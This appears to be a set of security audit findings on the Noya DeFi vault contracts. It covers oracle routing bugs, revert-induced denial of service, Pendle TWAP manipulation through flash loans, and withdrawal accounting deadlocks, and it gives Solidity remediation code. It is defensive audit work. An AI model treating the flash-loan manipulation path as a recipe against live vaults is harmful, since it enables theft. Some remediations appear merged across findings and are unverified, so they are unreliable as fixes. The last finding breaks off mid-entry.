In `AccountingManager.sol`, `getPositionTVL` calculates the value of a standard token holding position (`positionTypeId == 0`) in terms of the `base` token by calling `_getValue(token, base, amount)` at line 637, which delegates to `valueOracle.getValue(token, base, amount)` at line 646.

In `NoyaValueOracle.sol`, `getValue(address asset, address baseToken, uint256 amount)` fetches the configured intermediate hop tokens from `priceRoutes[asset][baseToken]` and calls the internal multi-hop valuation function `_getValue(address asset, address baseToken, uint256 amount, address[] memory sources)` (lines 81–93):

```solidity
function _getValue(address asset, address baseToken, uint256 amount, address[] memory sources)
    internal
    view
    returns (uint256 value)
{
    uint256 initialValue = amount;
    address quotingToken = asset;
    for (uint256 i = 0; i < sources.length; i++) {
        initialValue = _getValue(asset, sources[i], initialValue);
        quotingToken = sources[i];
    }
    return _getValue(quotingToken, baseToken, initialValue);
}
```

To value token `A` in terms of `D` across a multi-hop route `[B, C]` (where price sources exist for `A -> B`, `B -> C`, and `C -> D`), the loop is intended to iteratively convert the running amount (`initialValue`) from the current `quotingToken` to the next hop token `sources[i]`, updating `quotingToken = sources[i]` after each hop.

However, on line 89, the recursive call passes `asset` instead of `quotingToken` as the first argument:
```solidity
initialValue = _getValue(asset, sources[i], initialValue);
```

- On iteration `i = 0`, `quotingToken == asset` (`A`), so `_getValue(A, B, amount)` converts `amount` of `A` into `initialValue` denominated in `B`, and sets `quotingToken = B`.
- On iteration `i = 1`, `initialValue` is now denominated in `B`, and `quotingToken` is `B`. Instead of calling `_getValue(B, C, initialValue)`, the contract calls `_getValue(A, C, initialValue)`.
- Because no direct price feed exists between `A` and `C` (which is why a multi-hop route was configured), `_getValue(A, C, initialValue)` either reverts with `NoyaOracle_PriceOracleUnavailable` / `NoyaChainlinkOracle_PRICE_ORACLE_UNAVAILABLE` / `INoyaOracle_ValueOracleUnavailable`, or—if a price source for `(A, C)` happens to exist—treats an amount denominated in `B` (with `B`'s price and decimals) as an amount of `A`, producing a completely corrupted quote.

Consequently, `AccountingManager.getPositionTVL` and `AccountingManager.TVL` revert (causing a denial of service on deposits, withdrawals, and share pricing) or return an inaccurate TVL whenever a vault holds a token that relies on a multi-hop price route with `sources.length >= 2`.

findings.remediation:
In `NoyaValueOracle._getValue`, pass `quotingToken` instead of `asset` as the first argument to `_getValue` inside the loop.

```solidity
    function _getValue(address asset, address baseToken, uint256 amount, address[] memory sources)
        internal
        view
        returns (uint256 value)
    {
        uint256 initialValue = amount;
        address quotingToken = asset;
        for (uint256 i = 0; i < sources.length; i++) {
            initialValue = _getValue(quotingToken, sources[i], initialValue);
            quotingToken = sources[i];
        }
        return _getValue(quotingToken, baseToken, initialValue);
    }
```

findings.technical_details:
In `contracts/helpers/BaseConnector.sol` (lines 253–261), the internal helper `_getValue(address token, address baseToken, uint256 amount)` converts a `token` amount into `baseToken` units using `valueOracle`:

```solidity
function _getValue(address token, address baseToken, uint256 amount) internal view returns (uint256) {
    if (token == baseToken) {
        return amount;
    }
    if (amount == 0) {
        return 0;
    }
    return valueOracle.getValue(token, baseToken, amount);
}
```

However, holding token positions (where `positionTypeId == 0`) use `AccountingManager` as their `calculatorConnector` (see `BaseConnector._updateTokenInRegistry` at line 138: `bytes32 positionId = registry.calculatePositionId(accountingManager, 0, abi.encode(token))`).

When `TVLHelper.getTVL` calculates the vault's total value locked, it calls `IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken)`. For holding token positions (`positionTypeId == 0`), this calls `AccountingManager.getPositionTVL` (lines 632–640), which fetches `uint256 amount = IERC20(token).balanceOf(abi.decode(position.data, (address)))` and passes it to `AccountingManager._getValue` (lines 642–647):

```solidity
function _getValue(address token, address base, uint256 amount) internal view returns (uint256) {
    if (token == base) {
        return amount;
    }
    return valueOracle.getValue(token, base, amount);
}
```

Similarly, `AaveConnector._getPositionTVL` (line 117) calls `valueOracle.getValue(poolBaseToken, base, poolBaseAmount)` directly without using `_getValue` or checking if `poolBaseAmount == 0`.

In `INoyaValueOracle`, `getValue(address asset, address baseCurrency, uint256 amount)` reverts with `INoyaValueOracle_InvalidInput()` when `amount == 0` (or when Chainlink/Uniswap oracle sub-routes reject a `0` input). Consequently, whenever a connector holds a registered non-base token position whose balance becomes `0` (before `_updateTokenInRegistry` removes it, or if a position remains registered with zero balance) or when `AaveConnector` has `totalCollateralBase == totalDebtBase`, calling `TVL()` reverts instead of returning `0` for that position.

findings.remediation:
Ensure all value conversions consistently use the zero-amount guard present in `BaseConnector._getValue`. Specifically, add the `amount == 0` check to `AccountingManager._getValue` and use `_getValue` in `AaveConnector._getPositionTVL`.

In `contracts/accountingManager/AccountingManager.sol`:
```solidity
    function _getValue(address token, address base, uint256 amount) internal view returns (uint256) {
        if (token == base) {
            return amount;
        }
        if (amount == 0) {
            return 0;
        }
        return valueOracle.getValue(token, base, amount);
    }
```

In `contracts/connectors/AaveConnector.sol`:
```solidity
    function _getPositionTVL(HoldingPI memory, address base) public view override returns (uint256 tvl) {
        (uint256 totalCollateralBase, uint256 totalDebtBase,,,,) = IPool(pool).getUserAccountData(address(this));
        uint256 poolBaseAmount = totalCollateralBase - totalDebtBase;
        return _getValue(poolBaseToken, base, poolBaseAmount);
    }
```

findings.technical_details:
In `PendleConnector._getPositionTVL` (lines 270–283), the connector aggregates the value of LP tokens, Principal Tokens (`_PT`), and Yield Tokens (`_YT`) held by the connector for a Pendle market position:

```solidity
if (lpBalance > 0) {
    SYAmount += lpBalance * IPMarket(market).getLpToAssetRate(10) / 1e18;
}

uint256 PTAmount = _PT.balanceOf(address(this));
if (PTAmount > 0) SYAmount += PTAmount * IPMarket(market).getPtToAssetRate(10) / 1e18;

uint256 YTBalance = _YT.balanceOf(address(this));
if (YTBalance > 0) SYAmount += getYTValue(market, YTBalance);
```

This valuation logic fails across the market lifecycle and propagates external reverts into `TVLHelper.getTVL` and `AccountingManager.TVL()`:

1. **YT Valuation Reverts at and after Maturity (Line 278):**
   When `YTBalance > 0`, `_getPositionTVL` unconditionally calls `getYTValue(market, YTBalance)`, which invokes `staticRouter.swapExactYtForSyStatic(market, YTBalance)`. In Pendle, YT tokens have zero value upon maturity (`block.timestamp >= expiry`), and all market swap operations check `MiniHelpers.isExpired(market.expiry, blockTime)` and revert with `Errors.MarketExpired()`. Furthermore, `PendleConnector` provides no mechanism to burn, transfer, or redeem YT tokens after maturity (both `swapYTForPT` and `swapYTForSY` also revert when the market is expired). Consequently, if the connector holds even 1 wei of YT when the market expires, `_getPositionTVL` permanently reverts.

2. **Liquidity-Dependent Static Swap Quote Reverts (Line 278):**
   Even prior to maturity, `staticRouter.swapExactYtForSyStatic(market, YTBalance)` simulates swapping the entire `YTBalance` in a single AMM trade. If `YTBalance` is large relative to the pool's liquidity (e.g., pushing the pool proportion above `MAX_MARKET_PROPORTION` of 96%, exhausting available PT in `executeTradeCore`, or failing binary search approximation in `ApproxFail`), the static call reverts and bricks `_getPositionTVL`.

3. **LP Valuation Reverts at Maturity and on Uninitialized Oracle Cardinality (Lines 271 & 275):**
   When `lpBalance > 0`, `IPMarket(market).getLpToAssetRate(10)` executes `PendleLpOracleLib.getLpToAssetRate`. Although `getLpToAssetRate` includes a branch for `if (state.expiry <= block.timestamp)`, it first executes `MarketPreCompute memory comp = _getMarketPreCompute(market, state)` on line 23 of `PendleLpOracleLib.sol`, which calls `MarketMathCore.getMarketPreCompute` and immediately reverts with `Errors.MarketExpired()` when `market.expiry <= block.timestamp`. Additionally, both `getLpToAssetRate(10)` and `getPtToAssetRate(10)` call `market.observe` with a 10-second TWAP window without verifying that the market's oracle cardinality has been initialized and populated, reverting if observations are unavailable.

findings.remediation:
Skip YT valuation when the market is expired (since expired YT has zero value), handle potential static router revert conditions gracefully (or price YT via the PT TWAP rate: `1 SY - PT_rate_in_SY`), and ensure post-expiry LP valuation does not call `MarketMathCore.getMarketPreCompute` on an expired market.

In `PendleConnector._getPositionTVL`:

```solidity
            if (lpBalance > 0) {
                SYAmount += lpBalance * IPMarket(market).getLpToAssetRate(10) / _SY.exchangeRate();
            }

            uint256 PTAmount = _PT.balanceOf(address(this));
            if (PTAmount > 0) SYAmount += PTAmount * IPMarket(market).getPtToAssetRate(10) / _SY.exchangeRate();

            uint256 YTBalance = _YT.balanceOf(address(this));
            if (YTBalance > 0 && !IPMarket(market).isExpired()) {
                try staticRouter.swapExactYtForSyStatic(market, YTBalance) returns (
                    uint256 netSyOut, uint256, uint256, uint256, uint256, uint256, uint256
                ) {
                    SYAmount += netSyOut;
                } catch {
                    uint256 ptRateInAsset = IPMarket(market).getPtToAssetRate(10);
                    if (ptRateInAsset < 1e18) {
                        SYAmount += (YTBalance * (1e18 - ptRateInAsset)) / _SY.exchangeRate();
                    }
                }
            }

            if (SYAmount > 0) underlyingBalance += SYAmount * _SY.exchangeRate() / 1e18;

            tvl = valueOracle.getValue(_underlyingToken, base, underlyingBalance);
```

findings.technical_details:
In `PendleConnector._getPositionTVL` (`contracts/connectors/PendleConnector.sol`), the connector values its holdings in a Pendle market (`SY`, `LP`, `PT`, and `YT`) and converts the aggregated balance into the vault's `base` token to report TVL to `AccountingManager`:

```solidity
if (lpBalance > 0) {
    SYAmount += lpBalance * IPMarket(market).getLpToAssetRate(10) / 1e18;
}

uint256 PTAmount = _PT.balanceOf(address(this));
if (PTAmount > 0) SYAmount += PTAmount * IPMarket(market).getPtToAssetRate(10) / 1e18;

uint256 YTBalance = _YT.balanceOf(address(this));
if (YTBalance > 0) SYAmount += getYTValue(market, YTBalance);

if (SYAmount > 0) underlyingBalance += SYAmount * _SY.exchangeRate() / 1e18;

tvl = valueOracle.getValue(_underlyingToken, base, underlyingBalance);
```

This valuation logic suffers from multiple interrelated market oracle integrity flaws:

1. **Short-Window TWAP Manipulation (lines 271, 275):** `getLpToAssetRate(10)` and `getPtToAssetRate(10)` pass a hardcoded `duration` of `10` seconds into `PendleLpOracleLib` and `PendlePtOracleLib`. Because `10` seconds is shorter than a single Ethereum mainnet block (12 seconds), `market.observe()` weights the most recent observation over an extremely narrow window, and `PendleLpOracleLib._getPtRates` further averages `rateOracle` with the current block's `state.lastLnImpliedRate` (`rateHypTrade = (rateLastTrade + rateOracle) / 2`).
2. **Liquidity-Sensitive Spot Quote Distortion (lines 278, 293–296):** `getYTValue(market, YTBalance)` calls `staticRouter.swapExactYtForSyStatic(market, balance)`, which simulates executing an immediate spot trade of the entire `YTBalance` against the current AMM state (`IPMarket.readState`). This spot quote reflects instantaneous pool reserves, suffers from price impact proportional to `YTBalance` relative to pool liquidity, and can be arbitrarily skewed within a single transaction.
3. **Inconsistent Spot and Time-Averaged Pricing & Transient Exchange Rate (lines 271–280):** Combining short-window TWAP rates for PT/LP, spot swap outputs with price impact for YT, and the instantaneous `_SY.exchangeRate()` creates inconsistent pricing across the components of the same Pendle market position. Furthermore, `getLpToAssetRate` and `getPtToAssetRate` already scale by the SY index (returning asset units rather than SY units), while line 280 multiplies the combined `SYAmount` by `_SY.exchangeRate() / 1e18` again.

An attacker can use a flash loan to trade heavily in the Pendle market (or manipulate the instantaneous state of the SY/market reserves), distorting `lastLnImpliedRate`, pool reserves, and spot swap quotes to artificially inflate or deflate `_getPositionTVL` and `AccountingManager.TVL()`.

findings.remediation:
Use a configurable, sufficiently long TWAP duration (e.g., 1800 seconds / 30 minutes) for Pendle oracle queries, derive YT valuation from the manipulation-resistant PT TWAP rate (`1 - ptRate`) rather than a spot AMM swap simulation (`swapExactYtForSyStatic`), and ensure consistent asset/SY unit conversions:

```solidity
            uint32 twapDuration = 1800;
            uint256 syExchangeRate = _SY.exchangeRate();
            if (SYAmount > 0) {
                underlyingBalance += (SYAmount * syExchangeRate) / 1e18;
            }

            if (lpBalance > 0) {
                underlyingBalance += (lpBalance * IPMarket(market).getLpToAssetRate(twapDuration)) / 1e18;
            }

            uint256 PTAmount = _PT.balanceOf(address(this));
            uint256 ptToAssetRate = IPMarket(market).getPtToAssetRate(twapDuration);
            if (PTAmount > 0) {
                underlyingBalance += (PTAmount * ptToAssetRate) / 1e18;
            }

            uint256 YTBalance = _YT.balanceOf(address(this));
            if (YTBalance > 0 && !IPMarket(market).isExpired()) {
                uint256 pyIndex = Math.max(syExchangeRate, _YT.pyIndexStored());
                uint256 fullAssetRate = (1e18 * syExchangeRate) / pyIndex;
                if (fullAssetRate > ptToAssetRate) {
                    underlyingBalance += (YTBalance * (fullAssetRate - ptToAssetRate)) / 1e18;
                }
            }

            tvl = valueOracle.getValue(_underlyingToken, base, underlyingBalance);
```

findings.technical_details:
In `PendleConnector._getPositionTVL` (`contracts/connectors/PendleConnector.sol`), the connector values LP and PT holdings by calling `PendleLpOracleLib.getLpToAssetRate` and `PendlePtOracleLib.getPtToAssetRate` with a hardcoded TWAP window of `duration = 10` seconds:

```solidity
if (lpBalance > 0) {
    SYAmount += lpBalance * IPMarket(market).getLpToAssetRate(10) / 1e18;
}

uint256 PTAmount = _PT.balanceOf(address(this));
if (PTAmount > 0) SYAmount += PTAmount * IPMarket(market).getPtToAssetRate(10) / 1e18;
```

Both library functions delegate to `PendlePtOracleLib.getPtToAssetRate(market, 10)`, which (prior to market expiry) calls `_getMarketLnImpliedRate(market, 10)`:

```solidity
function _getMarketLnImpliedRate(IPMarket market, uint32 duration) private view returns (uint256) {
    uint32[] memory durations = new uint32[](2);
    durations[0] = duration;

    uint216[] memory lnImpliedRateCumulative = market.observe(durations);
    return (lnImpliedRateCumulative[1] - lnImpliedRateCumulative[0]) / duration;
}
```

`IPMarket.observe(durations)` interpolates cumulative implied rates between `block.timestamp - 10` and `block.timestamp` using the market's internal ring buffer (`observations`). In Pendle markets, this ring buffer requires:
1. At least one initialized observation (`OracleUninitialized` or `OracleZeroCardinality` otherwise).
2. An `observationCardinality` large enough so that the oldest stored observation in the ring buffer has a timestamp at or before `block.timestamp - duration` (`OracleTargetTooOld(target, oldest)` otherwise).

By default, newly deployed or low-cardinality Pendle markets have `observationCardinality = 1`. When `observationCardinality == 1`, any trade or LP mint in the current block overwrites `observations[0]` with `blockTimestamp = uint32(block.timestamp)`. Consequently, the oldest available observation in the buffer is at `0` seconds ago, which is newer than the requested `10`-second lookback window.

`PendleConnector` never calls `IPMarket.increaseObservationsCardinalityNext` when entering a market (e.g., in `supply` or `depositIntoMarket`) and never checks oracle readiness (such as via `IPPtOracle.getOracleState(market, 10)`) or falls back when `market.observe` fails in `_getPositionTVL`. As a result, any call to `_getPositionTVL` while holding LP or PT tokens in a market with insufficient observation cardinality or observation age reverts and propagates through `TVLHelper.getTVL` to `AccountingManager.TVL()`.

findings.remediation:
Ensure the market's observation cardinality is expanded when initializing or interacting with the market, and validate oracle observation readiness (or fall back to spot/instantaneous implied rate when a 10-second observation window is not yet satisfied) during valuation.

In `PendleConnector._getPositionTVL`, use a helper that checks whether the 10-second observation window is satisfied (or falls back to `duration = 0` when the oldest observation is younger than 10 seconds):

```solidity
            if (lpBalance > 0) {
                uint32 lpTwapDuration = _getValidTwapDuration(IPMarket(market), 10);
                SYAmount += lpBalance * IPMarket(market).getLpToAssetRate(lpTwapDuration) / 1e18;
            }

            uint256 PTAmount = _PT.balanceOf(address(this));
            if (PTAmount > 0) {
                uint32 ptTwapDuration = _getValidTwapDuration(IPMarket(market), 10);
                SYAmount += PTAmount * IPMarket(market).getPtToAssetRate(ptTwapDuration) / 1e18;
            }
```

Where `_getValidTwapDuration` checks the market's observation ring buffer (and `supply` calls `IPMarket(market).increaseObservationsCardinalityNext(...)` to ensure sufficient cardinality for the 10-second window).

Add the asset-denominated values of `lpBalance` and `PTAmount` directly to `underlyingBalance` instead of `SYAmount`, so that only SY-denominated balances (`_SY.balanceOf(address(this))` and `getYTValue`) are multiplied by `_SY.exchangeRate()`:

```solidity
            if (lpBalance > 0) {
                underlyingBalance += lpBalance * IPMarket(market).getLpToAssetRate(10) / 1e18;
            }

            uint256 PTAmount = _PT.balanceOf(address(this));
            if (PTAmount > 0) underlyingBalance += PTAmount * IPMarket(market).getPtToAssetRate(10) / 1e18;

            uint256 YTBalance = _YT.balanceOf(address(this));
            if (YTBalance > 0) SYAmount += getYTValue(market, YTBalance);

            if (SYAmount > 0) underlyingBalance += SYAmount * _SY.exchangeRate() / 1e18;
```

findings.technical_details:
In the Noya protocol, holding positions with `positionTypeId == 0` represent direct ERC20 token holdings held by connectors or managers. When a token holding position is registered in `PositionRegistry`, the blueprint `PositionBP.data` stores `abi.encode(token)` (as seen in `BaseConnector.getUnderlyingTokens` at line 235 and `AccountingManager.getUnderlyingTokens` at line 652), while the holding position instance `HoldingPI.data` stores `abi.encode(ownerAddress)` — the address of the connector holding the tokens.

On the base chain, `AccountingManager` serves as the `calculatorConnector` for `positionTypeId == 0` positions and calculates their TVL in `AccountingManager.getPositionTVL` (lines 632–640):
```solidity
PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
if (p.positionTypeId == 0) {
    address token = abi.decode(p.data, (address));
    uint256 amount = IERC20(token).balanceOf(abi.decode(position.data, (address)));
    return _getValue(token, base, amount);
}
```
Here, `abi.decode(position.data, (address))` retrieves the specific connector address that holds the ERC20 balance.

However, on normal (non-base) chains where `AccountingManager` is not deployed, `OmnichainManagerNormalChain` acts as the vault's manager and TVL aggregator (`getTVL()` calls `TVLHelper.getTVL`). In `OmnichainManagerNormalChain._getPositionTVL` (lines 33–41):
```solidity
function _getPositionTVL(HoldingPI memory position, address base) public view override returns (uint256) {
    PositionBP memory bp = registry.getPositionBP(vaultId, position.positionId);
    if (bp.positionTypeId == 0) {
        address token = abi.decode(bp.data, (address));
        uint256 amount = IERC20(token).balanceOf(address(this));
        return _getValue(token, base, amount);
    }
    return 0;
}
```
And in `BaseConnector.getPositionTVL` (lines 249–251), it directly delegates to `_getPositionTVL(p, baseToken)` without handling `positionTypeId == 0` (even though `BaseConnector.getUnderlyingTokens` at lines 233–237 explicitly handles `positionTypeId == 0`).

This creates two interconnected valuation failures for `positionTypeId == 0` holding positions:
1. **Balance Attribution Error in `OmnichainManagerNormalChain`:** Because `_getPositionTVL` hardcodes `balanceOf(address(this))` instead of `balanceOf(abi.decode(position.data, (address)))`, if `OmnichainManagerNormalChain` is the `calculatorConnector` for `positionTypeId == 0` across multiple connectors on the normal chain:
   - Any tokens held by other connectors (where `abi.decode(position.data, (address)) != address(omnichainManagerNormalChain)`) are completely ignored (valued at `0` if `OmnichainManagerNormalChain` holds `0` of that token).
   - Conversely, if `OmnichainManagerNormalChain` holds a balance of `token`, and multiple connectors on the same chain have active holding positions for `token`, `TVLHelper.getTVL` will iterate over each `HoldingPI` and repeatedly count `OmnichainManagerNormalChain`'s own balance for every connector's position, multiplying the reported TVL.
2. **Omitted Valuation in `BaseConnector`:** If a connector inheriting from `BaseConnector` is configured as the `calculatorConnector` for `positionTypeId == 0`, `BaseConnector.getPositionTVL` does not check `positionTypeId == 0` (unlike `BaseConnector.getUnderlyingTokens` at lines 233–237) and instead calls `_getPositionTVL`, whicheither returns `0` (the default virtual implementation in `BaseConnector`) or executes protocol-specific logic that ignores `positionTypeId == 0`.

findings.remediation:
Update `OmnichainManagerNormalChain._getPositionTVL` (or move the `positionTypeId == 0` valuation logic directly into `BaseConnector.getPositionTVL` so it matches `BaseConnector.getUnderlyingTokens` and `AccountingManager.getPositionTVL`) to decode the token holder address from `position.data`.

```solidity
    function getPositionTVL(HoldingPI memory p, address baseToken) public view returns (uint256) {
        PositionBP memory bp = registry.getPositionBP(vaultId, p.positionId);
        if (bp.positionTypeId == 0) {
            address token = abi.decode(bp.data, (address));
            uint256 amount = IERC20(token).balanceOf(abi.decode(p.data, (address)));
            return _getValue(token, baseToken, amount);
        }
        return _getPositionTVL(p, baseToken);
    }
```

And in `OmnichainManagerNormalChain._getPositionTVL`:
```solidity
    function _getPositionTVL(HoldingPI memory position, address base) public view override returns (uint256) {
        PositionBP memory bp = registry.getPositionBP(vaultId, position.positionId);
        if (bp.positionTypeId == 0) {
            address token = abi.decode(bp.data, (address));
            uint256 amount = IERC20(token).balanceOf(abi.decode(position.data, (address)));
            return _getValue(token, base, amount);
        }
        return 0;
    }
```

findings.technical_details:
In `contracts/helpers/TVLHelper.sol`, `getTVL` computes the net Total Value Locked (TVL) of a vault by fetching all `HoldingPI` entries from `PositionRegistry.getHoldingPositions(vaultId)` and iterating over each position (lines 17–29):

```solidity
for (uint256 i = 0; i < positions.length; i++) {
    if (positions[i].calculatorConnector == address(0)) {
        continue;
    }
    uint256 tvl = IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken);
    bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
    if (isPositionDebt) {
        totalDebt += tvl;
    } else {
        totalTVL += tvl;
    }
}
```

This implementation has two closely related valuation-dependency flaws at lines 19–22:

1. **Missing active-connector validation**: `getTVL` only skips index `0` (where `calculatorConnector == address(0)`). However, `PositionRegistry.addConnector` (lines 188–198 of `Registry.sol`) allows disabling a connector (`vault.connectors[connector].enabled = false`) even while holding positions still reference it as their `calculatorConnector`. `TVLHelper.getTVL` does not check `registry.isAnActiveConnector(vaultId, positions[i].calculatorConnector)`, continuing to query disabled or obsolete connectors.
2. **Single-calculator failure propagation**: Each iteration performs a direct, unhandled external call to `IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken)` (line 22). Because connectors rely on external protocol states and price oracles (e.g., Uniswap V3 TWAP `OracleLibrary.consult`, Aave pools, or Chainlink feeds) to compute position valuations, any revert in a single position's `getPositionTVL`—whether from a paused external pool, oracle failure, or an incompatible/disabled calculator connector—propagates uncaught and aborts the entire `getTVL` execution.

Because `AccountingManager.TVL()` (line 628 of `AccountingManager.sol`) and `OmnichainManagerNormalChain.getTVL()` (line 21 of `OmnichainManagerNormalChain.sol`) directly invoke `TVLHelper.getTVL`, a revert in any single calculator blocks `AccountingManager.deposit()` (which checks `if (TVL() > depositLimitTotalAmount)` at line 211) as well as share calculation and profit accounting across the entire vault.

findings.remediation:
Validate that the `calculatorConnector` is still an active connector in the registry before querying it, and wrap the external `getPositionTVL` call or ensure disabled/obsolete connectors are safely handled according to protocol risk policy (e.g., skipping disabled connectors or handling reverts gracefully):

```solidity
    function getTVL(uint256 vaultId, PositionRegistry registry, address baseToken) public view returns (uint256) {
        uint256 totalTVL;
        uint256 totalDebt;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            address calculator = positions[i].calculatorConnector;
            if (calculator == address(0) || !registry.isAnActiveConnector(vaultId, calculator)) {
                continue;
            }
            try IConnector(calculator).getPositionTVL(positions[i], baseToken) returns (uint256 tvl) {
                bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
                if (isPositionDebt) {
                    totalDebt += tvl;
                } else {
                    totalTVL += tvl;
                }
            } catch {
                continue;
            }
        }
        if (totalTVL < totalDebt) {
            return 0;
        }
        return (totalTVL - totalDebt);
    }
```

findings.technical_details:
When a withdrawal group is started in `AccountingManager`, `currentWithdrawGroup.totalCBAmount` stores the total base token amount calculated for queued withdrawal requests at the time of `calculateWithdrawShares()`. To gather these funds from active connectors, the manager calls `retrieveTokensForWithdraw()`, which:
1. Queries `uint256 neededAssets = neededAssetsForWithdraw()` (line 550).
2. Calls `IConnector(connectorAddress).sendTokensToTrustedAddress(address(baseToken), retrieveData[i].withdrawAmount, ...)` for each connector (line 556).
3. Accumulates the requested pre-slippage amounts into `amountAskedForWithdraw += amountAskedForWithdraw_temp` (lines 561, 569).
4. Enforces `if (amountAskedForWithdraw_temp > neededAssets) revert NoyaAccounting_INVALID_AMOUNT()` (lines 570–572).

In `BaseConnector.sendTokensToTrustedAddress()` (lines 90–98), the connector decodes the actual post-slippage `newAmount`, verifies it via `Watchers(watcherContract).verifyRemoveLiquidity(amount, newAmount, newData)`, and transfers `newAmount` to `AccountingManager`. Because of slippage or withdrawal fees when unwinding external protocol positions, `newAmount` is often strictly less than the requested `withdrawAmount`.

To handle this slippage and socialize it proportionally across the withdrawal group via `currentWithdrawGroup.totalABAmount`, `fulfillCurrentWithdrawGroup()` (lines 372–376) checks:
```solidity
uint256 neededAssets = neededAssetsForWithdraw();

if (neededAssets != 0 && amountAskedForWithdraw != currentWithdrawGroup.totalCBAmount) {
    revert NoyaAccounting_NOT_READY_TO_FULFILL();
}
```

However, `neededAssetsForWithdraw()` (lines 616–625) is implemented as:
```solidity
function neededAssetsForWithdraw() public view returns (uint256) {
    uint256 availableAssets = baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;
    if ( // check if the withdraw group is fullfilled
        currentWithdrawGroup.isStarted == false || currentWithdrawGroup.isFullfilled == true
            || availableAssets >= currentWithdrawGroup.totalCBAmount
    ) {
        return 0;
    }
    return currentWithdrawGroup.totalCBAmount - availableAssets;
}
```

Because `neededAssetsForWithdraw()` only compares and subtracts `availableAssets` (which reflects the post-slippage tokens actually held by `AccountingManager`) rather than accounting for `amountAskedForWithdraw`, three failure modes arise whenever slippage occurs (`newAmount < withdrawAmount`):

1. **Deadlock when `AccountingManager` holds pre-existing `availableAssets`:**
   If `AccountingManager` holds any idle `baseToken` not belonging to `depositQueue.totalAWFDeposit` (from prior operations, uninvested liquidity, or a direct token transfer) before `retrieveTokensForWithdraw()` is called, `availableAssets > 0`. Consequently, `neededAssetsForWithdraw()` returns `currentWithdrawGroup.totalCBAmount - availableAssets < currentWithdrawGroup.totalCBAmount`. Because `retrieveTokensForWithdraw()` reverts if `amountAskedForWithdraw_temp > neededAssets`, the manager can only request at most `currentWithdrawGroup.totalCBAmount - availableAssets`. When the connector transfers `newAmount < withdrawAmount` due to slippage, the resulting `availableAssets` is still less than `currentWithdrawGroup.totalCBAmount` (so `neededAssets != 0`), while `amountAskedForWithdraw` is strictly less than `currentWithdrawGroup.totalCBAmount`. Calling `fulfillCurrentWithdrawGroup()` then reverts with `NoyaAccounting_NOT_READY_TO_FULFILL()`.

2. **Deadlock across multiple `retrieveTokensForWithdraw()` calls:**
   If the manager retrieves funds across multiple transactions (or multiple connectors in separate batches) and the first call incurs slippage (`newAmount_1 < withdrawAmount_1`), `availableAssets` increases by `newAmount_1` while `amountAskedForWithdraw` increases by `withdrawAmount_1`. On the subsequent call, `neededAssetsForWithdraw()` returns `totalCBAmount - availableAssets`, which overstates the remaining amount to ask by `withdrawAmount_1 - newAmount_1`. If the manager requests this overstated `neededAssets` amount, `amountAskedForWithdraw` exceeds `currentWithdrawGroup.totalCBAmount`, violating the strict inequality `amountAskedForWithdraw != currentWithdrawGroup.totalCBAmount` in `fulfillCurrentWithdrawGroup()` whenever total post-slippage `availableAssets < totalCBAmount`.

3. **Non-zero `neededAssetsForWithdraw()` after full retrieval:**
   Even after `amountAskedForWithdraw == currentWithdrawGroup.totalCBAmount`, if slippage occurred (`availableAssets < currentWithdrawGroup.totalCBAmount`), `neededAssetsForWithdraw()` continues to return `currentWithdrawGroup.totalCBAmount - availableAssets > 0` instead of `0`. This allows `retrieveTokensForWithdraw()` to be called again to pull additional funds from connectors (socializing the withdrawal slippage onto non-withdrawing vault shareholders instead of the withdrawal group) and causes `amountAskedForWithdraw` to exceed `currentWithdrawGroup.totalCBAmount`.

findings.remediation:
Update `neededAssetsForWithdraw()` (or track the pre-existing idle balance when starting a withdrawal group) so that `amountAskedForWithdraw` is accounted for when determining whether additional assets must be requested from connectors. Specifically, in `neededAssetsForWithdraw()`, account for the greater of `availableAssets` and `amountAskedForWithdraw` (or check whether `amountAskedForWithdraw` has already covered the needed retrieval):

```solidity
    function neededAssetsForWithdraw() public view returns (uint256) {
        uint256 availableAssets = baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;
        uint256 coveredAssets = availableAssets > amountAskedForWithdraw ? availableAssets : amountAskedForWithdraw;
        if ( // check if the withdraw group is fullfilled
            currentWithdrawGroup.isStarted == false || currentWithdrawGroup.isFullfilled == true
                || coveredAssets >= currentWithdrawGroup.totalCBAmount
        ) {
            return 0;
        }
        return currentWithdrawGroup.totalCBAmount - coveredAssets;
    }
```

Deduct the `baseToken` obligations locked for calculated and fulfilled withdrawals in `currentWithdrawGroup` from `TVL()` (alongside burning or excluding the corresponding calculated withdrawal shares from the active share supply when calculating `totalCBAmount`). In `TVL()`, subtract the reserved withdraw group assets (`currentWithdrawGroup.totalCBAmount` and the remaining unexecuted portion of `currentWithdrawGroup.totalABAmount`):

```solidity
    function TVL() public view returns (uint256) {
        uint256 totalAssetsValue = TVLHelper.getTVL(vaultId, registry, address(baseToken))
            + baseToken.balanceOf(address(this));
        uint256 reservedAssets = depositQueue.totalAWFDeposit + currentWithdrawGroup.totalCBAmount
            + currentWithdrawGroup.totalABAmount;
        if (totalAssetsValue <= reservedAssets) {
            return 0;
        }
        return totalAssetsValue - reservedAssets;
    }
```

findings.technical_details:
The vault's total value locked (`TVL`) is composed of two parts:
1. The net value of active holding positions across connectors, calculated by `TVLHelper.getTVL(vaultId, registry, address(baseToken))`.
2. The idle `baseToken` held directly in `AccountingManager` excluding pending deposits: `baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit`.

In `Registry.sol` and `TVLHelper.sol`, holding positions can be marked with `isDebt = true` (checked via `registry.isPositionDebt(vaultId, positions[i].positionId)`), which represents debt that must be deducted from the total value of the vault. In `TVLHelper.getTVL()` (lines 23–33):

```solidity
bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
if (isPositionDebt) {
    totalDebt += tvl;
} else {
    totalTVL += tvl;
}
...
if (totalTVL < totalDebt) {
    return 0;
}
return (totalTVL - totalDebt);
```

`AccountingManager.TVL()` (lines 627–630) then computes:

```solidity
function TVL() public view returns (uint256) {
    return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
        - depositQueue.totalAWFDeposit;
}
```

